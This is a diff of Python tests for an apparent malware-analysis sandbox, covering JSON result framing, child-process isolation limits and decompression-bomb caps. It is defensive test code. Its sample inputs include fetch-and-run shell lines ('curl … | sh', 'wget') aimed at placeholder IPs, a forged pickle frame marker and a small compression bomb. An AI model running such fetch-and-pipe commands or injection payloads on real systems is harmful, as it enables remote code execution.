@@ -202,5 +202,234 @@ class TestSandbox:
 
     async def test_frame_round_trips(self):
         report = {"file_kind": "elf", "nested": {"a": [1, 2, 3]}}
-        framed = b"noise from a library\n" + sandbox.frame(report)
-        assert sandbox._decode(framed) == {"status": "complete", "report": report}
+        assert sandbox._decode(sandbox.frame(report)) == {"status": "complete", "report": report}
+
+    def test_frame_is_only_read_from_the_start_of_stdout(self):
+        # The frame used to be found by searching stdout for a marker, which
+        # is what let bytes inside the report pose as a second frame.
+        framed = sandbox.frame({"file_kind": "elf"})
+        for tampered in (b"noise from a library\n" + framed, framed + b"\n", framed[:-1], b""):
+            result = sandbox._decode(tampered)
+            assert result["status"] == "failed", tampered[:20]
+            assert "report" not in result
+
+    def test_result_must_be_a_json_object(self):
+        import json
+
+        for payload in (b"[1, 2]", b'"text"', b"not json", b"\xff\xfe"):
+            framed = sandbox._HEADER.pack(sandbox._FRAME_MAGIC, len(payload)) + payload
+            assert sandbox._decode(framed)["status"] == "failed"
+        ok = json.dumps({"a": 1}).encode()
+        framed = sandbox._HEADER.pack(sandbox._FRAME_MAGIC, len(ok)) + ok
+        assert sandbox._decode(framed) == {"status": "complete", "report": {"a": 1}}
+
+    def test_report_strings_cannot_pose_as_a_result_frame(self):
+        """A string from the sample that looks like the old frame stays a string.
+
+        The parent used to take the *last* ``PLD\\x00`` marker in the child's
+        output and unpickle what followed. A report quotes text out of the
+        uploaded file, so the file could supply that marker and the bytes
+        after it. The stand-in here is a pickled plain dict: with the old
+        decoder it came back as the whole analysis result.
+        """
+        import pickle
+
+        forged = pickle.dumps({"file_kind": "forged-by-the-sample"})
+        hostile = (b"PLD\x00" + struct.pack(">I", len(forged)) + forged).decode("latin-1")
+        report = {"file_kind": "script", "script": {"behaviours": [{"evidence": hostile}]}}
+
+        framed = sandbox.frame(report)
+        assert b"PLD\x00" not in framed  # JSON escapes the NUL; no raw marker survives
+
+        result = sandbox._decode(framed)
+        assert result["status"] == "complete"
+        assert result["report"]["file_kind"] == "script"
+        assert result["report"]["script"]["behaviours"][0]["evidence"] == hostile
+
+    def test_sandbox_module_does_not_use_pickle(self):
+        import inspect
+
+        from app.payloads import _sandbox_main
+
+        for module in (sandbox, _sandbox_main):
+            source = inspect.getsource(module)
+            assert "import pickle" not in source and "pickle.loads" not in source
+
+    async def test_sample_carrying_the_old_marker_is_analysed_as_data(self):
+        import pickle
+
+        forged = pickle.dumps({"file_kind": "forged-by-the-sample"})
+        body = (
+            b"#!/bin/sh\nwget http://203.0.113.9/x # "
+            + b"PLD\x00" + struct.pack(">I", len(forged)) + forged + b"\n"
+        )
+        result = await sandbox.run(body, timeout=30, memory_mb=512)
+        assert result["status"] == "complete", result
+        assert result["report"]["file_kind"] == "script"
+        assert result["report"]["hashes"]["sha256"] == __import__("hashlib").sha256(body).hexdigest()
+
+    def test_every_analyser_output_survives_json(self):
+        import json
+
+        buffer = io.BytesIO()
+        with zipfile.ZipFile(buffer, "w") as archive:
+            archive.writestr("run.sh", "#!/bin/sh\nwget http://203.0.113.7/a\n")
+        samples = [
+            _elf(),
+            b"MZ" + b"\x00" * 200,
+            b"#!/bin/sh\ncurl http://198.51.100.5/x | sh\n",
+            buffer.getvalue(),
+            gzip.compress(b"plain text inside"),
+            b"\x00\x01\x02",
+            b"",
+        ]
+        for sample in samples:
+            report = analyzer.analyse(sample)
+            # The exact call the child makes; raises on anything unserialisable.
+            decoded = sandbox._decode(sandbox.frame(report))
+            assert decoded["status"] == "complete"
+            assert decoded["report"] == json.loads(json.dumps(sandbox.to_jsonable(report)))
+
+    def test_to_jsonable_converts_what_pickle_used_to_carry(self):
+        value = {
+            "bytes": b"\x7fELF\x00",
+            "tuple": (1, 2),
+            "set": {"b", "a"},
+            "nan": float("nan"),
+            3: "integer key",
+            "object": object,
+        }
+        converted = sandbox.to_jsonable(value)
+        assert converted["bytes"] == "\x7fELF\x00"
+        assert converted["tuple"] == [1, 2]
+        assert converted["set"] == ["a", "b"]
+        assert converted["nan"] is None
+        assert converted["3"] == "integer key"
+        assert isinstance(converted["object"], str)
+
+
+class TestSandboxIsolation:
+    def test_child_environment_carries_none_of_the_parents_secrets(self, monkeypatch):
+        monkeypatch.setenv("SECRET_KEY", "must-not-reach-the-child")
+        monkeypatch.setenv("DATABASE_URL", "postgresql://must-not-reach-the-child")
+        env = sandbox._child_environment(memory_mb=512, timeout=30)
+        assert set(env) == {
+            "PATH", "PYTHONPATH", "PAYLOAD_MEMORY_MB", "PAYLOAD_CPU_SECONDS",
+            "PYTHONDONTWRITEBYTECODE", "OPENBLAS_NUM_THREADS", "OMP_NUM_THREADS",
+            "MKL_NUM_THREADS", "NUMEXPR_NUM_THREADS",
+        }
+        assert "must-not-reach-the-child" not in " ".join(env.values())
+
+    @pytest.mark.skipif(not __import__("sys").platform.startswith("linux"), reason="rlimits and prctl are Linux-only")
+    def test_child_limits_are_hard_and_include_nproc(self):
+        """Run the child's own limit code in a throwaway process and read it back."""
+        import json
+        import subprocess
+        import sys
+
+        probe = (
+            "import json, resource, sys\n"
+            "from app.payloads import _sandbox_main\n"
+            "from app.core import hardening\n"
+            "hardening.set_no_new_privs()\n"
+            "_sandbox_main._apply_limits()\n"
+            "names = ['RLIMIT_AS', 'RLIMIT_CPU', 'RLIMIT_FSIZE', 'RLIMIT_NOFILE', 'RLIMIT_NPROC', 'RLIMIT_CORE']\n"
+            "out = {n: resource.getrlimit(getattr(resource, n)) for n in names}\n"
+            "out['no_new_privs'] = hardening.has_no_new_privs()\n"
+            "sys.stdout.write(json.dumps(out))\n"
+        )
+        env = sandbox._child_environment(memory_mb=1024, timeout=30)
+        completed = subprocess.run(
+            [sys.executable, "-s", "-c", probe], env=env, capture_output=True, timeout=60,
+        )
+        assert completed.returncode == 0, completed.stderr.decode()
+        limits = json.loads(completed.stdout)
+        for name in ("RLIMIT_AS", "RLIMIT_CPU", "RLIMIT_FSIZE", "RLIMIT_NOFILE", "RLIMIT_NPROC", "RLIMIT_CORE"):
+            soft, hard = limits[name]
+            assert soft == hard, f"{name} hard limit left above the soft one"
+        assert limits["RLIMIT_FSIZE"] == [0, 0]
+        assert limits["RLIMIT_NPROC"] == [0, 0]
+        assert limits["RLIMIT_AS"][1] == 1024 * 1024 * 1024
+        assert limits["no_new_privs"] is True
+
+    @pytest.mark.skipif(not __import__("sys").platform.startswith("linux"), reason="prctl is Linux-only")
+    def test_api_process_can_be_made_non_dumpable(self):
+        # In a child, so the test runner itself keeps its normal flags.
+        import subprocess
+        import sys
+
+        probe = (
+            "from app.core import hardening\n"
+            "before = hardening.is_dumpable()\n"
+            "ok = hardening.make_non_dumpable()\n"
+            "print(before, ok, hardening.is_dumpable())\n"
+        )
+        env = sandbox._child_environment(memory_mb=1024, timeout=30)
+        completed = subprocess.run(
+            [sys.executable, "-s", "-c", probe], env=env, capture_output=True, timeout=60,
+        )
+        assert completed.stdout.decode().split() == ["True", "True", "False"], completed.stderr.decode()
+
+
+class TestArchiveBounds:
+    @pytest.mark.parametrize("container", ["gzip", "bzip2", "xz"])
+    def test_single_stream_is_decompressed_within_a_cap(self, container, monkeypatch):
+        import bz2
+        import lzma
+
+        from app.payloads import archive
+
+        import tracemalloc
+
+        compress = {"gzip": gzip.compress, "bzip2": bz2.compress, "xz": lzma.compress}[container]
+        # 24 MiB of zeros compresses to a few kilobytes: the shape of a bomb,
+        # at a size that is harmless to build in a test.
+        inflated_size = 24 * 1024 * 1024
+        bomb = compress(b"\x00" * inflated_size)
+        assert len(bomb) < 64 * 1024
+        monkeypatch.setattr(archive, "MAX_TOTAL_UNCOMPRESSED", 256 * 1024)
+        monkeypatch.setattr(archive, "_CHUNK", 64 * 1024)
+
+        tracemalloc.start()
+        try:
+            info = archive.analyse(bomb, container)
+            _, peak = tracemalloc.get_traced_memory()
+        finally:
+            tracemalloc.stop()
+
+        assert info["error"] == "decompressed size exceeds budget"
+        assert info["members"] == [] and "_extracted" not in info
+        # It stopped near the cap. Decompressing first and measuring after,
+        # as before, would have peaked at the full inflated size.
+        # (The xz decoder's own dictionary accounts for several megabytes.)
+        assert peak < inflated_size // 2, f"peak allocation {peak} bytes"
+
+    @pytest.mark.parametrize("container", ["gzip", "bzip2", "xz"])
+    def test_small_stream_still_extracts(self, container):
+        import bz2
+        import lzma
+
+        from app.payloads import archive
+
+        compress = {"gzip": gzip.compress, "bzip2": bz2.compress, "xz": lzma.compress}[container]
+        info = archive.analyse(compress(b"#!/bin/sh\necho hi\n"), container)
+        assert info["member_count"] == 1
+        assert info["_extracted"] == [("(decompressed)", b"#!/bin/sh\necho hi\n")]
+
+    def test_truncated_stream_is_an_error_not_a_crash(self):
+        from app.payloads import archive
+
+        info = archive.analyse(gzip.compress(b"x" * 10000)[:40], "gzip")
+        assert "error" in info and info["members"] == []
+
+
+class TestStorableLabels:
+    def test_long_shebang_cannot_overflow_the_file_type_column(self):
+        ft = identify.identify(b"#!/usr/bin/" + b"A" * 5000 + b"\necho hi\n")
+        assert ft.kind == "script"
+        assert len(ft.label) <= 64 and len(ft.subtype) <= 32 and len(ft.mime) <= 64
+
+    def test_shebang_with_control_bytes_gives_a_clean_label(self):
+        ft = identify.identify(b"#!/bin/\x01\x02sh\x7f\necho hi\n")
+        assert ft.kind == "script"
+        assert all(32 <= ord(ch) < 127 for ch in ft.label)
